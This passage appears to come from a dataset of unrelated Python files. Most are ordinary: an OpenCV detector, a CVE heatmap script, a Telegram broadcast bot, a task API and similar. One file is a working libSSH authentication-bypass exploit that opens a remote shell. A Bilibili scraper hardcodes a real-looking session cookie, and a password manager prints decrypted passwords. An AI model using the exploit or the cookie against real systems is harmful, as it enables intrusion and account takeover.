'POST'])\ndef index():\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=9898)",
    "import random\nfrom http import HTTPStatus\nimport dashscope\nfrom dashscope import Generation\nfrom chat_flow.normal_flow import salesAgent\n\nclass qwen_salesAgent(salesAgent):\n    def __init__(self, MODEL, KEY):\n        if KEY == None:\n            print('key missing') \n            return\n        if MODEL == 'qwen':\n            MODEL='qwen1.5-72b-chat'\n        dashscope.api_key = KEY\n        super().__init__(MODEL, KEY)\n\n    def talk_to_seller(self, query, history):\n        history += [{\n                \"role\": \"user\", \n                \"content\": query\n            }]\n\n        response = Generation.call(\n            self.MODEL,\n            messages=history,\n            seed=random.randint(1, 10000),  # set the random seed, optional, default to 1234 if not set\n            result_format='message',  # set the result to be \"message\"  format.\n            stream=True,\n            output_in_full=False  # get streaming output incrementally\n        )\n\n        return response  \n    \n    def correct_response(self,response):\n        if response.status_code == HTTPStatus.OK:\n            return response.output.choices[0]['message']['content']\n        return None\n\n    \n  \n",
    "import cv2\nimport numpy as np \n\n\nvideo = '/home/ankan_opencv/officework/indore-talk24-projects/OpenCV-DNN-Object-Detection-with-SSD/street.mp4'\nimage = '/home/ankan_opencv/officework/indore-talk24-projects/OpenCV-DNN-Object-Detection-with-SSD/dog.jpg'\n\ndef load_model():\n    model= cv2.dnn.readNet(model='frozen_inference_graph.pb',\n                           config='ssd_mobilenet_v2_coco_2018_03_29.pbtxt.txt',\n                           framework='TensorFlow')\n    with open('object_detection_classes_coco.txt', 'r') as f:\n        class_names = f.read().split('\\n')\n    COLORS = np.random.uniform(0, 255, size=(len(class_names), 3))\n    return model, class_names, COLORS   \n\ndef load_img(img_path):\n    img=cv2.imread(img_path)\n    img=cv2.resize(img, None, fx=0.4, fy=0.4)\n    height, width, channels = img.shape\n    return img, height, width, channels\n\ndef detect_objects(img, net):\t\t\t\n\tblob = cv2.dnn.blobFromImage(img, size=(300, 300), mean=(104, 117, 123), swapRB=True)\n\tnet.setInput(blob)\n\toutputs = net.forward()\n\t#print (outputs)\n\treturn blob, outputs\n\ndef get_box_dimensions(outputs, height, width):\n\tboxes = []\n\tclass_ids = []\n \n\tfor detect in outputs[0,0,:,:]:\n\t\tscores = detect[2]\n\t\tclass_id = detect[1]\n\t\tif scores > 0.3:\n\t\t\tw = int(detect[5] * width)\n\t\t\th = int(detect[6] * height)\n\t\t\tx = int((detect[3] * width))\n\t\t\ty = int((detect[4] * height))\n\t\t\tboxes.append([x, y, w, h])\n\t\t\tclass_ids.append(class_id)\n\treturn boxes, class_ids\n\ndef draw_labels(boxes, colors, class_ids, classes, img): \n\tfont = cv2.FONT_HERSHEY_PLAIN\n\tmodel, classes, colors = load_model()\n\tfor i in range(len(boxes)):\n\t\tx, y, w, h = boxes[i]\n\t\tlabel = classes[int(class_ids[0])-1]\n\t\tcolor = colors[i]\n\t\tcv2.rectangle(img, (x,y), (w,h), color, 2)\n\t\tcv2.putText(img, label, (x, y - 5), font, 1, color, 1)\n\treturn img\n\ndef image_detect(img_path): \n\tmodel, classes, colors = load_model()\n\timage, height, width, channels = load_img(img_path)\n\tblob, outputs = detect_objects(image, model)\n\tboxes, class_ids = get_box_dimensions(outputs, height, width)\n\timg_out = draw_labels(boxes, colors, class_ids, classes, image)\n\tcv2.imshow('image', img_out)\n\tcv2.waitKey(0)\n\tcv2.destroyAllWindows()\n\n\t\n\t\n\ndef start_video(video_path):\n    model, classes, colors = load_model()\n    cap = cv2.VideoCapture(video_path)\n\n    if not cap.isOpened():\n        print(\"Error: Could not open video.\")\n        return\n\n    while True:\n        ret, frame = cap.read()\n        if not ret:\n            break  # Exit the loop if the video ends or cannot read the frame\n\n        height, width, channels = frame.shape\n        blob, outputs = detect_objects(frame, model)\n        boxes, class_ids = get_box_dimensions(outputs, height, width)\n        frame = draw_labels(boxes, colors, class_ids, classes, frame)\n        # frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n        cv2.imshow('output', frame)\n\n        if cv2.waitKey(1) & 0xFF == ord('q'):  # Press 'q' to exit the loop\n            break\n\n    cap.release()\n    cv2.destroyAllWindows()\n\n\n\ndef write_video(video_path):\n    model, classes, colors = load_model()\n    cap = cv2.VideoCapture(video_path)\n\n    if not cap.isOpened():\n        print(\"Error: Could not open video.\")\n        return\n\n    # Get video properties to initialize VideoWriter\n    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))\n    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))\n    fps = int(cap.get(cv2.CAP_PROP_FPS))\n    \n    # Initialize the VideoWriter object\n    out = cv2.VideoWriter('output_video.mp4', cv2.VideoWriter_fourcc(*'mp4v'), fps, (frame_width, frame_height))\n\n    while True:\n        ret, frame = cap.read()\n        if not ret:\n            break  # Exit the loop if the video ends or cannot read the frame\n\n        height, width, channels = frame.shape\n        blob, outputs = detect_objects(frame, model)\n        boxes, class_ids = get_box_dimensions(outputs, height, width)\n        frame = draw_labels(boxes, colors, class_ids, classes, frame)\n        # cv2.imshow('output', frame)\n        \n        # Write the processed frame to the output video file\n        out.write(frame)\n\n        if cv2.waitKey(1) & 0xFF == ord('q'):  # Press 'q' to exit the loop\n            break\n\n    cap.release()\n    out.release()  # Release the VideoWriter object\n    cv2.destroyAllWindows()\n\n\n# write_video(video)\n\n# start_video(video)\n\nimage_detect(image)",
    "import time\r\nimport requests\r\nimport random\r\nimport os\r\n\r\n\r\nLOG_DIR = '.\\\\log'\r\ncookie = '''buvid3=FB0CB882-9D22-4B22-B84F-B34D5257A9C435692infoc; b_nut=1710053235; i-wanna-go-back=-1; b_ut=7; _uuid=CFE16EF10-A942-210A2-6577-C15985410B29736137infoc; enable_web_push=DISABLE; buvid4=B7B1128A-02A1-D449-AFC3-FE961957C71036241-024031006-lPdNycUBl7NKGeVq2YrRgQ%3D%3D; rpdid=|(u))uRJ|Jkk0J'u~u||lJkRk; DedeUserID=364386712; DedeUserID__ckMd5=91a731121ca04638; header_theme_version=CLOSE; PVID=1; CURRENT_QUALITY=80; fingerprint=09a311839a24769d1626c4e8f73eac9b; buvid_fp_plain=undefined; FEED_LIVE_VERSION=V_HEADER_LIVE_NO_POP; bili_ticket=eyJhbGciOiJIUzI1NiIsImtpZCI6InMwMyIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTIwNjA4NDksImlhdCI6MTcxMTgwMTU4OSwicGx0IjotMX0.e8b8jECevC7J4e0qCDmX4MJ4964gkULTqNHKlu1BKOw; bili_ticket_expires=1712060789; home_feed_column=5; browser_resolution=1844-1059; CURRENT_BLACKGAP=0; CURRENT_FNVAL=4048; bp_video_offset_364386712=914693820644327462; SESSDATA=3e5b1cf2%2C1727362996%2C3c944%2A31CjA7CV0DOedMGxZbA--wZVsocnFkLRFEMlKMl1MOB_KBwpnbGKh3UVs1IeHtbHa8qTcSVlNjb1E5dlZKMlFLYzRUZ1FNalR4YzhySmt6am5ETExqcmNNQ21xYnNuVVVDVGt2bzVIOG1fMTdsUDlJazZPMUV6UVk3VU5PNmdFTDJwbl9FYjhrcnFBIIEC; bili_jct=955033a1cdb68d777532c9c5c683a655; buvid_fp=09a311839a24769d1626c4e8f73eac9b; b_lsid=DF5D10BFC_18E92A1044E; sid=nlnadpez'''\r\n\r\ndef RequestUrl(url, referer='', origin='', cookie=''):\r\n    headers = {\r\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',\r\n        'Referer': referer,\r\n        'Cookie': cookie,\r\n        'Origin': origin\r\n    }\r\n\r\n    try:\r\n        r = requests.get(url, headers=headers, timeout=2)\r\n        time.sleep(random.uniform(1, 2))\r\n\r\n        return r\r\n\r\n    except requests.exceptions.Timeout:\r\n        log_error(\"\u8bf7\u6c42\u8d85\u65f6\", url)\r\n        return None\r\n\r\n    except requests.exceptions.RequestException as error:\r\n        log_error(f\"\u8bf7\u6c42\u9519\u8bef: {error}\", url)\r\n        return None\r\n\r\ndef log_error(error_message, url):\r\n    current_dir = os.path.dirname(__file__)\r\n    log_file = os.path.join(current_dir, 'error.txt')\r\n    with open(log_file, mode='a') as f:\r\n        f.write(f\"URL: {url}, \u9519\u8bef\u4fe1\u606f: {error_message}\\n\")\r\n",
    "import json\nimport pandas as pd\nimport seaborn as sns\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport requests\nimport zipfile\nimport io\nfrom datetime import datetime\nfrom datetime import date\n# Function to download and extract the JSON file\ndef download_extract_json(url):\n    response = requests.get(url)\n    response.raise_for_status()\n    zipfile_bytes = io.BytesIO(response.content)\n    with zipfile.ZipFile(zipfile_bytes, 'r') as zip_ref:\n        json_file = zip_ref.namelist()[0]  # Assuming there is only one file in the zip\n        json_data = zip_ref.read(json_file)\n    return json.loads(json_data)\n\ndef create_dataframe(cve_items):\n    records = []\n    for item in cve_items:\n        date = datetime.strptime(item['publishedDate'], \"%Y-%m-%dT%H:%MZ\").date()\n        has_references = bool(item['cve']['references']['reference_data'])\n        \n        # Improved CPE check\n        has_cpes = False\n        for node in item.get('configurations', {}).get('nodes', []):\n            if 'cpe_match' in node:\n                has_cpes = True\n                break\n            # Also check within children of the node, if present\n            for child in node.get('children', []):\n                if 'cpe_match' in child:\n                    has_cpes = True\n                    break\n            if has_cpes:\n                break\n\n        records.append((date, not has_references, not has_cpes))\n    return pd.DataFrame(records, columns=['Date', 'NoReferences', 'NoCPEs'])\n\n\n# Function to generate heatmap with custom annotations\ndef generate_heatmap(df_summary, value_column, total_column, filename_prefix, cmap):\n    total_missing = df_summary[value_column].sum()\n    total_cves = df_summary[total_column].sum()\n    \n    pivot_table = df_summary.pivot(index='WeekOfYear', columns='DayOfWeek', values=value_column).fillna(0).astype(int)\n    annotations = pivot_table.astype(str) + \"/\" + df_summary.pivot(index='WeekOfYear', columns='DayOfWeek', values=total_column).fillna(0).astype(int).astype(str)\n    \n    plt.figure(figsize=(20, 12))\n    sns.heatmap(pivot_table, cmap=cmap, linewidths=.5, annot=annotations, fmt='')\n    \n    # Create dynamic title including the total counts\n    today_str = date.today().strftime(\"%Y-%m-%d\")\n    if \"heatmap_total_cves\" in filename_prefix:\n        title = f\"Today ({today_str}) there are {total_missing} CVEs\"\n    else:\n        title = f\"Today ({today_str}) there are {total_missing} CVEs missing {filename_prefix.split('_')[-1].upper()} out of a total {total_cves} CVEs published in 2024\"\n    plt.title(title)\n    plt.tight_layout()\n\n    #Save for github README dynamic updates\n    filename = f\"{filename_prefix}.png\"\n    plt.savefig(filename)\n    plt.close()\n    # Save the heatmap with a filename including the generation date\n    filename = f\"historical/{filename_prefix}_{today_str}.png\"\n    plt.savefig(filename)\n    plt.close()\n    return filename\n\n\n\n# URL to the NVD JSON zip file\nurl = 'https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2024.json.zip'\n\n# Download and extract JSON data\ndata = download_extract_json(url)\n\n# Create DataFrame\ndf = create_dataframe(data['CVE_Items'])\n\n# Count CVEs per day and add day/week information\nend_date = datetime.now().date()\nall_dates = pd.date_range(start='2024-01-01', end=end_date, freq='D')\ndf_summary = df.groupby('Date').agg(TotalCVEs=('Date', 'size'),\n                                     NoReferences=('NoReferences', 'sum'),\n                                     NoCPEs=('NoCPEs', 'sum')).reindex(all_dates, fill_value=0)\ndf_summary['Date'] = pd.to_datetime(df_summary.index)\ndf_summary['DayOfWeek'] = df_summary['Date'].dt.dayofweek\ndf_summary['WeekOfYear'] = df_summary['Date'].dt.isocalendar().week\n\nfilename_cves = generate_heatmap(df_summary, 'TotalCVEs', 'TotalCVEs', 'heatmap_total_cves', 'Blues')\nfilename_no_references = generate_heatmap(df_summary, 'NoReferences', 'TotalCVEs', 'heatmap_no_references', 'OrRd')\nfilename_no_cpes = generate_heatmap(df_summary, 'NoCPEs', 'TotalCVEs', 'heatmap_no_cpes', 'OrRd')\n\n# Output paths to the saved heatmap images\nheatmap_paths = {\n    'total_cves': filename_cves,\n    'no_references': filename_no_references,\n    'no_cpes': filename_no_cpes\n}\nprint(heatmap_paths)",
    "import cryptography.fernet\r\nfrom cryptography.fernet import Fernet\r\nfrom tkinter.messagebox import *\r\n\r\n\r\nclass passwordManager:\r\n\r\n    def __init__(self):\r\n        self.key = None\r\n        self.pwd_file = None\r\n        self.pwd_dict: dict = {}\r\n        self.array_checker: set = set()\r\n        self.checkKeyValidility: bool = True\r\n\r\n    def create_key(self, path):\r\n        try:\r\n            self.key = Fernet.generate_key()\r\n            with open(path, 'wb') as f:\r\n                f.write(self.key)\r\n        except FileNotFoundError:\r\n            pass\r\n\r\n    def load_key(self, path):\r\n        try:\r\n            with open(path, 'rb') as f:\r\n                self.key = f.read()\r\n        except FileNotFoundError:\r\n            pass\r\n\r\n    def create_passwordFile(self, path, initial_values: dict = None):\r\n        self.pwd_file = path\r\n        with open(self.pwd_file, 'w'):\r\n            pass\r\n\r\n        if initial_values is not None:\r\n            for primeKey, subKey in initial_values.items():\r\n                for key, value in subKey.items():\r\n                    self.add_password(primeKey, key, value)\r\n\r\n    def load_passwordFile(self, path):\r\n        self.pwd_file = path\r\n        self.pwd_dict = {}\r\n\r\n        try:\r\n            with open(path, 'r') as f:\r\n                for line in f:\r\n                    try:\r\n                        site, email, encrypted_pwd = line.split(':')\r\n                        decryptedPass = Fernet(self.key).decrypt(encrypted_pwd.encode()).decode()\r\n                        self.pwd_dict[site] = {email: decryptedPass}\r\n                        self.array_checker = site, email, decryptedPass\r\n                    except ValueError:\r\n                        pass\r\n                # prints the decrypted dictionary, needed to be removed when done!!!\r\n                self.checkKeyValidility = True\r\n                print(self.pwd_dict)\r\n                print(self.array_checker)\r\n        except FileNotFoundError:\r\n            pass\r\n        except TypeError:\r\n            showerror('Error', '!!!the key is required first!!!')\r\n        except cryptography.fernet.InvalidToken:\r\n            self.checkKeyValidility = False\r\n            showerror('Error', '!!!Invalid key!!!')\r\n\r\n    def add_password(self, site, email, password):\r\n        self.pwd_dict[site] = {email: password}\r\n        # self.array_checker = site, email, password\r\n\r\n        if self.pwd_file is not None:\r\n            with open(self.pwd_file, 'a+') as f:\r\n                if (site not in self.array_checker) or \\\r\n                        (email not in self.array_checker) or (password not in self.array_checker):\r\n                    encrypted = Fernet(self.key).encrypt(password.encode())\r\n                    f.write(site + ':' + email + ':' + encrypted.decode() + '\\n')\r\n\r\n        # to check there's no repetitive same line when pressing submit button multiple times\r\n        # recalling the function \"load_passwordFile\" from a class \"passwordManager\"\r\n        passwordManager.load_passwordFile(self, self.pwd_file)\r\n\r\n    def get_password(self, site) -> list:\r\n        for primeKey, subKey in self.pwd_dict.items():\r\n            for key, value in subKey.items():\r\n                if primeKey == site:\r\n                    return [site, key, value]\r\n\r\n    def getAllSites(self) -> list:\r\n        # passwordManager.load_passwordFile(self, self.pwd_file)\r\n        return list(self.pwd_dict)\r\n\r\n    def delete_site(self, targetedSite):\r\n        newList: list = []\r\n\r\n        with open(self.pwd_file, 'r') as f:\r\n            lines: list = f.readlines()\r\n            for line in lines:\r\n                site, email, encrypted_pwd = line.split(':')\r\n                if targetedSite != site:\r\n                    newList.append(line)\r\n\r\n        with open(self.pwd_file, 'w') as f:\r\n            for line in newList:\r\n                f.write(line)\r\n\r\n        passwordManager.load_passwordFile(self, self.pwd_file)\r\n",
    "#@Autor: Felipe Frechiani de Oliveira\n#Este programa acessa o site do chatgpt e faz uma pergunta e captura a resposta por meio de um servidor do selenium.\n#Somente funcionou usando o firefox com o chrome n\u00e3o funcionou.  \n\nfrom selenium import webdriver\nimport time\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.firefox.options import Options\nfrom selenium.webdriver.common.action_chains import ActionChains\n\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\nfrom urllib.parse import urlparse, parse_qs\n\n\n\n\n\n# Fun\u00e7\u00e3o para fazer uma pergunta ao ChatGPT\ndef ask_gpt(question):\n\n    # Configura\u00e7\u00f5es do Selenium para se conectar a um servi\u00e7o Selenium remoto\n    selenium_host = 'selenium'  # Atualize com o endere\u00e7o IP ou o nome do host do seu servi\u00e7o Selenium remoto\n    selenium_port = '4444'  # Atualize com a porta em que o servi\u00e7o Selenium remoto est\u00e1 sendo executado\n    # URL da p\u00e1gina do ChatGPT\n    url = \"https://chat.openai.com/\"\n    print(\"Accessando url do chatgpt:\" + url)\n    print(\"Usando o broswer firefox...\")\n    # Configura\u00e7\u00e3o do WebDriver remoto\n    webdriver_remote_url = f\"http://{selenium_host}:{selenium_port}/wd/hub\"\n    print(\"Roda do selenium:\" + webdriver_remote_url)\n    firefox_options = Options()\n    browser = webdriver.Remote(webdriver_remote_url, options=firefox_options)\n\n    # Abre a p\u00e1gina do ChatGPT\n    try:   \n\n        browser.get(url)\n        print(\"URL da pagina:\" + browser.current_url)\n        print(\"Titulo da pagina:\" + browser.title)\n        time.sleep(2)  # Espera 3 segundos para garantir que a p\u00e1gina esteja carregada\n        # Insere a pergunta no campo de entrada\n        if browser is not None:       \n            input_field = browser.find_element(By.ID , \"prompt-textarea\")\n            #print(input_field)\n            actions = ActionChains(browser)\n            # Clica no bot\u00e3o\n            actions.click(input_field).perform()\n            input_field.send_keys(question)\n            # Clica no bot\u00e3o de enviar\n            submit_button = browser.find_element(By.XPATH , '//button[@data-testid=\"send-button\"]')\n            time.sleep(1)  # Espera 5 segundos para a resposta ser gerada\n            browser.save_screenshot(\"tela_antes_da_resposta.png\")\n            submit_button.click()\n            print(\"aguardando resposta\")\n            # Aguarda a resposta do ChatGPT\n            time.sleep(4)  # Espera 5 segundos para a resposta ser gerada\n            browser.save_screenshot(\"tela_depois_da_resposta.png\")\n            # Obt\u00e9m a resposta\n            response = browser.find_element(By.XPATH ,'//div[@data-message-author-role=\"assistant\"]').text\n            return response\n    except NoSuchElementException:\n        print(\"Elemento n\u00e3o encontrado na p\u00e1gina.\")   \n    \n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        post_params = parse_qs(post_data.decode('utf-8'))\n\n        if 'question' in post_params:\n            question = post_params['question'][0]\n            response = ask_gpt(question)  # Suponha que get_gpt_response seja sua fun\u00e7\u00e3o para interagir com o ChatGPT\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps({'response': response}).encode())\n        else:\n            self.send_response(400)\n            self.end_headers()\n            self.wfile.write(b'Bad Request')\n\ndef run(server_class=HTTPServer, handler_class=RequestHandler, port=8000):\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    print(f'Starting server on port {port}...')\n    httpd.serve_forever()\n    \n    \n    \n    \n\nif __name__ == \"__main__\":\n    run()\n\n\n\n\n",
    "# Import relevant classes from correct modules \r\nimport requests\r\nfrom llama_index.llms.openai import OpenAI\r\nfrom llama_index.agent.openai import OpenAIAgent\r\nfrom llama_index.core.tools import FunctionTool\r\nfrom llama_parse import LlamaParse\r\nfrom llama_index.core import VectorStoreIndex, StorageContext, load_index_from_storage\r\nfrom llama_index.core.tools import QueryEngineTool, ToolMetadata\r\nfrom llama_index.core.objects import ObjectIndex, SimpleToolNodeMapping\r\nfrom llama_index.agent.openai_legacy import FnRetrieverOpenAIAgent\r\nimport os\r\n\r\n# Set environmental variables\r\nos.environ[\"OPENAI_API_KEY\"] = \"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxZ7M\"\r\nopenai_api_key = os.environ[\"OPENAI_API_KEY\"]\r\n\r\n                    #Define 5 separate functions for the 4 API calls and 1 RAG system\r\n\r\n# Define Function 1 for LcL API Call\r\n\r\ndef fetch_LcL_freight_rates(origin, destination, cargo_weight, cargo_type, weight, length, width, height, units):\r\n    url = f\"yourendpoint?origin={origin}&destination={destination}&cargoWeight={cargo_weight}&cargoType={cargo_type}&weight={weight}&length={length}&width={width}&height={height}&units={units}\"\r\n    response = requests.get(url)\r\n    print(\"Request made\")\r\n\r\n    if response.ok:\r\n        try:\r\n            data = response.json()\r\n            print(\"Response obtained\")\r\n\r\n            LcL_quote_details = []\r\n\r\n            relevant_shipments = [\r\n                quote for quote in data\r\n                ]\r\n\r\n            if relevant_shipments:\r\n                print(\"LcL quote details:\")\r\n                for shipment in relevant_shipments:\r\n                    shipment_dict = {\r\n                        \"quoteId\": shipment[\"quoteId\"],\r\n                        \"countryOfOrigin\": shipment[\"countryOfOrigin\"],\r\n                        \"portOfOrigin\": shipment[\"portOfOrigin\"],\r\n                        \"portOfOriginCode\": shipment[\"portOfOriginCode\"],\r\n                        \"countryOfDestination\": shipment[\"countryOfDestination\"],\r\n                        \"portOfDestination\": shipment[\"portOfDestination\"],\r\n                        \"portOfDestinationCode\": shipment[\"portOfDestinationCode\"],\r\n                        \"carrier\": shipment[\"carrier\"],\r\n                        \"rate\": shipment[\"generalCargo\"] if shipment[\"generalCargo\"] else shipment[\"hazardousCargo\"],\r\n                        \"validFrom\": shipment[\"validFrom\"],\r\n                        \"validTo\": shipment[\"validTo\"],\r\n                        \"terms\": shipment[\"terms\"],\r\n                        \"bookingLink\": shipment[\"bookingLink\"]\r\n                    }\r\n                    LcL_quote_details.append(shipment_dict)\r\n                return LcL_quote_details\r\n            else:\r\n                print(\"No relevant shipments found.\")\r\n        except ValueError: \r\n            print(f\"Response is not JSON. Response content: {response.text}\")\r\n    else:\r\n        print(f\"Error fetching data. Status code: {response.status_code}. Response content: {response.text}\")\r\n\r\nLcL_freight_quote = fetch_LcL_freight_rates(\"china\", \"kenya\", 100, \"general\", 100, 10, 10, 10, \"inches\")\r\n\r\n# Define Function 2 for FcL API Call\r\n\r\ndef fetch_FcL_freight_rates(origin, destination, container_type, number_of_containers):\r\n    url = f\"yourendpoint?origin={origin}&destination={destination}&containerType={container_type}&numberOfContainers={number_of_containers}\"\r\n    response = requests.get(url)\r\n    print(\"Request made\")\r\n\r\n    if response.ok:\r\n        try:\r\n            data = response.json()\r\n            print(\"Response obtained\")\r\n\r\n            FcL_quote_details = []\r\n        \r\n            relevant_shipments = [\r\n                quote for quote in data\r\n                ]\r\n\r\n            if relevant_shipments:\r\n                print(\"FcL quote details:\")\r\n                for shipment in relevant_shipments:\r\n                    shipment_dict = {\r\n                        \"quoteId\": shipment[\"quoteId\"],\r\n                        \"countryOfOrigin\": shipment[\"countryOfOrigin\"],\r\n                        \"portOfOrigin\": shipment[\"portOfOrigin\"],\r\n                        \"portOfOriginCode\": shipment[\"portOfOriginCode\"],\r\n                        \"countryOfDestination\": shipment[\"countryOfDestination\"],\r\n                        \"portOfDestination\": shipment[\"portOfDestination\"],\r\n                        \"portOfDestinationCode\": shipment[\"portOfDestinationCode\"],\r\n                        \"carrier\": shipment[\"carrier\"],\r\n                        \"validFrom\": shipment[\"validFrom\"],\r\n                        \"validTo\": shipment[\"validTo\"],\r\n                        \"terms\": shipment[\"terms\"],\r\n                        \"bookingLink\": shipment[\"bookingLink\"]\r\n                    }\r\n                    FcL_quote_details.append(shipment_dict)\r\n                return FcL_quote_details\r\n            else:\r\n                print(\"No relevant shipments found.\")\r\n        except ValueError: \r\n            print(f\"Response is not JSON. Response content: {response.text}\")\r\n    else:\r\n        pr",
    "import paramiko\nimport socket\nimport argparse\nfrom sys import argv, exit\nimport select\nimport sys\n\nparser = argparse.ArgumentParser(description=\"libSSH Authentication Bypass\")\nparser.add_argument('-t', '--target', help='Specify target')\nparser.add_argument('-p', '--port', type=int, help='Specify port', default=int(22))\nparser.add_argument('-lf', '--logfile', help='Logfile to write connection log', default='paramiko.log')\n\nargs = parser.parse_args()\n\ndef bypass(target, port):\n\n    sock = socket.socket()\n    try:\n        sock.connect((target, port))\n\n        message = paramiko.Message()\n        transport = paramiko.Transport(sock=sock)\n        transport.start_client()\n\n        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)\n        transport._send_message(message)\n\n        channel = transport.open_session()\n        channel.get_pty()\n        channel.invoke_shell()\n\n        while True:\n            r, w, e = select.select([channel, sys.stdin], [], [])\n            if channel in r:\n                output = channel.recv(1024)\n                if len(output) == 0:\n                    print(\"Connection closed by remote host.\")\n                    break\n                sys.stdout.write(output.decode())\n                sys.stdout.flush()\n            if sys.stdin in r:\n                user_input = sys.stdin.readline()\n                channel.send(user_input)\n\n    except paramiko.SSHException as e:\n        print('Not vulnerable!')\n        return 1\n    except socket.error:\n        print('Unable to connect')\n        return 1\n    \ndef main():\n    paramiko.util.log_to_file(args.logfile)\n    try:\n        target = args.target\n        port = args.port\n    except:\n        parser.print_help()\n        exit(1)\n    bypass(target, port)\n\nif __name__ =='__main__':\n    exit(main())\n",
    "from pyrogram import Client, filters\nimport datetime\nimport time\nfrom database.users_chats_db import db\nfrom info import ADMINS\nfrom utils import broadcast_messages, broadcast_messages_group\nimport asyncio\n        \n@Client.on_message(filters.command(\"broadcast\") & filters.user(ADMINS) & filters.reply)\n# https://t.me/GetTGLink/4178\nasync def verupikkals(bot, message):\n    users = await db.get_all_users()\n    b_msg = message.reply_to_message\n    sts = await message.reply_text(\n        text='Broadcasting your messages...'\n    )\n    start_time = time.time()\n    total_users = await db.total_users_count()\n    done = 0\n    blocked = 0\n    deleted = 0\n    failed =0\n\n    success = 0\n    async for user in users:\n        pti, sh = await broadcast_messages(int(user['id']), b_msg)\n        if pti:\n            success += 1\n        elif pti == False:\n            if sh == \"Blocked\":\n                blocked+=1\n            elif sh == \"Deleted\":\n                deleted += 1\n            elif sh == \"Error\":\n                failed += 1\n        done += 1\n        await asyncio.sleep(2)\n        if not done % 20:\n            await sts.edit(f\"Broadcast in progress:\\n\\nTotal Users {total_users}\\nCompleted: {done} / {total_users}\\nSuccess: {success}\\nBlocked: {blocked}\\nDeleted: {deleted}\")    \n    time_taken = datetime.timedelta(seconds=int(time.time()-start_time))\n    await sts.edit(f\"Broadcast Completed:\\nCompleted in {time_taken} seconds.\\n\\nTotal Users {total_users}\\nCompleted: {done} / {total_users}\\nSuccess: {success}\\nBlocked: {blocked}\\nDeleted: {deleted}\")\n\n@Client.on_message(filters.command(\"grp_broadcast\") & filters.user(ADMINS) & filters.reply)\nasync def broadcast_group(bot, message):\n    groups = await db.get_all_chats()\n    b_msg = message.reply_to_message\n    sts = await message.reply_text(\n        text='Broadcasting your messages To Groups...'\n    )\n    start_time = time.time()\n    total_groups = await db.total_chat_count()\n    done = 0\n    failed =0\n\n    success = 0\n    async for group in groups:\n        pti, sh = await broadcast_messages_group(int(group['id']), b_msg)\n        if pti:\n            success += 1\n        elif sh == \"Error\":\n                failed += 1\n        done += 1\n        if not done % 20:\n            await sts.edit(f\"Broadcast in progress:\\n\\nTotal Groups {total_groups}\\nCompleted: {done} / {total_groups}\\nSuccess: {success}\")    \n    time_taken = datetime.timedelta(seconds=int(time.time()-start_time))\n    await sts.edit(f\"Broadcast Completed:\\nCompleted in {time_taken} seconds.\\n\\nTotal Groups {total_groups}\\nCompleted: {done} / {total_groups}\\nSuccess: {success}\")\n        \n",
    "import json\nimport os\n\nfilename = \"./tasks.json\"   #   Run on No IDE   #\n# filename = \"./DevSecOps/python/tasks_API/tasks.json\"   #   Ubuntu   #\n# filename = 'C:\\\\Users\\\\Stas\\\\Desktop\\\\DevOps\\\\DevSecOps\\\\python\\\\tasks_API\\\\tasks.json'   #   Windows   #\n# pathlib\n\n# Check if Json file exsist, if not create it.\ndef ensure_file_exists():\n    if not os.path.exists(filename):\n        with open(filename, 'w') as file:\n            json.dump({ \"next_task_id\":1, \"tasks\":[  ]}, file)\n\nensure_file_exists()\n\n\n# Get all tasks\ndef get_all_tasks():\n    with open(filename, \"r\") as file:\n        data = json.load(file)\n        return data\n\n# Get single task\ndef get_single_task(task_id):\n    tasks = get_all_tasks()\n    for task in tasks[\"tasks\"]:\n            if task['id'] == task_id:\n                return json.dumps(task)              \n    return json.dumps({\"message\": \"Task not found, This slot ia empty\"})\n\n# Add new task\ndef add_new_task(new_task):\n    tasks = get_all_tasks()\n    \n    title = new_task.get('title')\n    details = new_task.get('details')\n    if title is None or details is None:\n        return json.dumps({\"error\": \"Title and details are required fields.\"})\n    task_id = tasks[\"next_task_id\"]\n    tasks[\"next_task_id\"] +=1\n    task = {'id': task_id, 'title': title, 'details': details}\n    tasks[\"tasks\"].append(task)\n    with open(filename, \"w\") as file:\n        json.dump(tasks, file)\n    return json.dumps({\"message\": f\"Task number {task_id} was added\"})\n\n\n# Update existing task\ndef update_task(task_id, data):\n    with open(filename, \"r\") as file:\n        tasks = json.load(file)\n    for task in tasks[\"tasks\"]:\n        if task['id'] == task_id:\n            task['title'] = data.get('title', task['title'])\n            task['details'] = data.get('details', task['details'])\n            with open(filename, \"w\") as file:\n                json.dump(tasks, file)\n            return task\n    return None\n\n# Delete existing task\ndef delete_task(task_id):\n    with open(filename, \"r\") as file:\n        tasks = json.load(file)\n    for task in tasks[\"tasks\"]:\n        if task['id'] == task_id:\n            tasks[\"tasks\"].remove(task)\n            with open(filename, \"w\") as file:\n                json.dump(tasks, file)\n            return task\n    return None\n\n",
